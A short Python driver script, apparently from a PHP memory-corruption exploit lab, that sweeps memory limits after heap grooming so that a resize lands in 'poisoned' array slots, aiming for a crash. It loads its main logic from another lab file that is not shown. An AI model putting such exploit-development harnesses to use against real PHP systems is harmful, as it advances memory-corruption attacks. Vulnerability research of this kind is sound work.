#!/usr/bin/env python3
"""oom40: poison-zone sweep — prep=4 (196 poisoned pages in pool), limit
sweep pulls the page-countdown C=1 back inside arData-2's poisoned slots
[2048..4095], BEFORE the elem-4096 resize intercepts. Target: rc=139 or
keydeath with elem in zone.
usage: oom40.py [lo] [hi] [step=524288]
"""
import sys

exec(open("/tmp/phplab/oom39.py").read().replace('if __name__ == "__main__":', 'if False:'))

if __name__ == "__main__":
    lo = int(sys.argv[1]) if len(sys.argv) > 1 else 22_400_000
    hi = int(sys.argv[2]) if len(sys.argv) > 2 else 23_900_000
    step = int(sys.argv[3]) if len(sys.argv) > 3 else 524_288
    for lim in range(lo, hi + 1, step):
        if decode_lim(lim, 4, 200000):
            break
